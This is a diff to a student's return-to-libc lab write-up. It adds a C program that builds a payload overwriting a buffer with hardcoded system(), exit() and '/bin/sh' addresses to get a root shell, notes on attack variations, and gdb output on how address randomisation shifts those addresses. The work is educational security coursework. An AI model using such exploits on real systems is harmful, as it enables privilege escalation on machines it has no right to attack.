@@ -113,8 +113,79 @@ with open("badfile", "wb") as f:
     f.write(content)
 ```
 
-**Note**: in the line 5, the length of `content` should be set to a smaller number instead of 300 both in the templete and source code offered by the official site. 
+**Note**: in the line 5, the length of `content` should be set to a smaller number instead of 300 both in the templete and source code offered by the official site.
 
-Finally I can get
+Or use the C version `exploit.c`:
+
+```c
+#include <stdlib.h>
+#include <stdio.h>
+#include <string.h>
+int main(int argc, char **argv)
+{
+    char buf[40];
+    FILE *badfile;
+
+    badfile = fopen("./badfile", "w");
+
+    /* You need to decide the addresses and 
+     the values for X, Y, Z. The order of the following 
+     three statements does not imply the order of X, Y, Z.
+     Actually, we intentionally scrambled the order. */
+    *(long *)&buf[32] = 0xbffffdef; //  "/bin/sh"
+    *(long *)&buf[24] = 0xb7e42da0; //  system()
+    *(long *)&buf[28] = 0xb7e369d0; //  exit()
+
+    fwrite(buf, sizeof(buf), 1, badfile);
+    fclose(badfile);
+}
+```
+
+Finally I got
 
 ![](root_shell.png)
+
+## Attack variation 1
+
+The root shell can also be launched. But when exiting the shell, the `retlib` can not be terminated properly. It issues a `Segmentation fault` error.
+
+## Attack variation 2
+
+```shell
+mv retlib newretlib
+./newretlib
+zsh:1: command not found: h
+Segmentation fault
+```
+
+Before environment variables are pushed into the stack, the program's name is pushed in first. So the location of `/bin/sh` will shift if the length of program's name changes.
+
+# Task 4
+
+It failed. 
+
+`X`,`Y` and `Z` are determined by the relative distance to `ebp`, which is not influenced by the address randomization.
+
+But the address of `system`,`exit`, and `/bin/sh` are updated.
+
+```shell
+./env666
+/bin/sh is in bfa0cdef
+rm badfile
+touch badfile
+gdb -q retlib
+gdb-peda$ set disable-randomization on
+gdb-peda$ r
+Starting program: /home/seed/Documents/return-to-libc/retlib 
+Returned Properly
+[Inferior 1 (process 6081) exited with code 01]
+Warning: not running or target is remote
+gdb-peda$ p system
+$1 = {<text variable, no debug info>} 0xb7616da0 <__libc_system>
+gdb-peda$ p exit
+$2 = {<text variable, no debug info>} 0xb760a9d0 <__GI_exit>
+gdb-peda$ quit
+```
+
+# Task 5
+
